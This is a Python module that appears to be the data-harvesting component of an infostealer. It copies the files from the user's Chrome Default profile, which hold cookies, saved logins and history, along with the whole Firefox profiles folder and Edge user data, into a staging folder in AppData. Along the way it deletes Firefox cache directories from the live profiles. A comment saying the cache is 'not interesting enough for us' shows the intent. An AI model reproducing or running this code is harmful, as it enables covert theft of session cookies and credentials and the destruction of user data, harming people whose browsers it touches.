import os
import shutil

import fileManager
import properties


def gather_data():
    """
    Gather data from browser like cookies history etc. and store it in your folder.
    :return:
    """
    appdata_path = properties.APPDATA_PATH
    appdata_home = appdata_path[:appdata_path.rfind(appdata_path.split("\\")[-1])]
    destfolder = appdata_path + "\\web\\BrowserData"
    if os.path.exists(destfolder): # If folder already exist, dont coppy anything
        return

    fileManager.make_road(destfolder)

    print("Gathering chrome")
    # chrome
    chrome_appdata_path = appdata_home + r"Local\Google\Chrome\User Data\Default\\"
    fileManager.make_road(destfolder+"\\Chrome\\")
    if os.path.exists(chrome_appdata_path):
        chrome_files = []
        for filename in os.listdir(chrome_appdata_path):
            path_to_file = chrome_appdata_path + filename
            if not os.path.isdir(path_to_file):
                # Copy file
                shutil.copyfile(path_to_file, destfolder + "\\Chrome\\" + path_to_file.split("\\")[-1])

    print("Gathering firefox")
    # firefox
    firefox_appdata_path = appdata_home+r"Local\Mozilla\Firefox\Profiles"
    if os.path.exists(firefox_appdata_path):
        # Delete huge cache dir. It stores so much space and its not interesting enough for us
        for file in os.listdir(firefox_appdata_path):
            file_in_profile = os.path.join(firefox_appdata_path, file)
            if os.path.isdir(file_in_profile):
                for subfile in os.listdir(file_in_profile):
                    subfile_fullpath = os.path.join(file_in_profile, subfile)
                    if "cache2" in subfile_fullpath:
                        shutil.rmtree(subfile_fullpath)
        shutil.copytree(firefox_appdata_path, destfolder+"\\FirefoxData")

    print("Gathering edge")
    # Microsoft edge
    edge_cookie_path = appdata_home + r"Local\MicrosoftEdge\User\Default"
    if os.path.exists(edge_cookie_path):
        shutil.copytree(edge_cookie_path, destfolder + "\\EdgeData")
    print("Browser data gathered")

# gather_data()